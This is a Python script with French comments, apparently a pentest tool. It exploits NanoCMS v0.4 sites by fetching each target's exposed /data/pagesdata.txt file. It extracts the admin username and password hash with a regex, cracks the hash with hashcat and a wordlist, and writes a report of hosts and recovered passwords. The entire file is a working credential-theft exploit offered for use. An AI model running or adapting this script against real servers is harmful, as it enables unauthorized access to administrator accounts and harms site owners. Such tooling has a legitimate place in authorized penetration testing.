#!/usr/bin/env python3

import os
import requests
import re
import subprocess
import sys

# Le premier argument est le nom du script, donc nous prenons le deuxième
main_dir = sys.argv[1]
# Le dossier contenant vos fichiers
source_dir = os.path.join("/Pentest", main_dir, "80/nanocms_v0.4")
# Le dossier où vous voulez enregistrer le fichier hashcat.potfile
potfile_dir = os.path.join("/Pentest", main_dir, "80/nanocms_v0.4")
# Chemin pour vérifier l'existance de dico.txt pour hashcat 
dico_path = "/Pentest/outils/hashcat/dico.txt"

# Parcourir tous les fichiers dans le dossier source
for filename in os.listdir(source_dir):
    if filename.endswith('.txt') and re.match(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\.txt', filename):
        # Extraire l'adresse IP du nom du fichier
        ip = filename.replace('.txt', '')
        # Construire l'URL
        url = f'http://{ip}/data/pagesdata.txt'
        # Faire une requête GET à l'URL
        response = requests.get(url)
        # Écrire la réponse dans le fichier
        with open(os.path.join(source_dir, filename), 'w') as output_file:
            output_file.write(response.text)
        
        # Extraire les informations de connexion
        match = re.search(r's:8:"username";s:(\d+):"(.*?)";s:8:"password";s:(\d+):"(.*?)"', response.text)
        if match:
            username_length, username, password_length, password = match.groups()
            # Créer un fichier pour le nom d'utilisateur
            with open(os.path.join(source_dir, 'login.txt'), 'w') as login_file:
                login_file.write(username)
            # Créer un fichier pour le mot de passe
            with open(os.path.join(source_dir, 'password.txt'), 'w') as password_file:
                password_file.write(password)

             # Vérifier si le fichier dico.txt existe
            if os.path.exists(dico_path):
                # Exécuter la commande hashcat
                hashcat_command = f'hashcat -m 0 -a 0 --potfile-path {potfile_dir}/hashcat.potfile {os.path.join(source_dir, "password.txt")} {dico_path}'
                subprocess.run(hashcat_command, shell=True)
            else:
                print("Le fichier dico.txt n'a pas été trouvé, hashcat ne sera pas lancé.")

            # Vérifier si le mot de passe a été trouvé
            with open(os.path.join(potfile_dir, 'hashcat.potfile'), 'r') as potfile:
                for line in potfile:
                    if password in line:
                        _, decrypted_password = line.strip().split(':')
                        print(f'Le mot de passe pour {ip} a été trouvé.')
                        # Écrire le mot de passe déchiffré dans un fichier
                        with open(os.path.join(source_dir, 'decrypter.txt'), 'w') as decrypter_file:
                            decrypter_file.write(decrypted_password)
                        break
                else:
                    print(f'Le mot de passe pour {ip} n\'a pas été trouvé.')
                    
                    # Créer un fichier pour le compte rendu

    with open(os.path.join(source_dir, 'compte_rendu.txt'), 'w') as compte_rendu:
        # Parcourir tous les fichiers dans le dossier source
        for filename in os.listdir(source_dir):
            if filename.endswith('.txt') and re.match(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\.txt', filename):
            # Extraire l'adresse IP du nom du fichier
                ip = filename.replace('.txt', '')
            # Lire le nom d'utilisateur
                with open(os.path.join(source_dir, 'login.txt'), 'r') as login_file:
                    username = login_file.read().strip()
            # Lire le mot de passe chiffré
                with open(os.path.join(source_dir, 'password.txt'), 'r') as password_file:
                    password = password_file.read().strip()
            # Lire le mot de passe déchiffré
                with open(os.path.join(source_dir, 'decrypter.txt'), 'r') as decrypter_file:
                    decrypted_password = decrypter_file.read().strip()
            # Écrire le compte rendu dans le fichier
                compte_rendu.write(f'Hôte (IP) : {ip}\n')
                compte_rendu.write(f'Nom d\'utilisateur : {username}\n')
                compte_rendu.write(f'Mot de passé chiffré :{password}\n')
                compte_rendu.write(f'Mot de passe déchiffré : {decrypted_password}\n')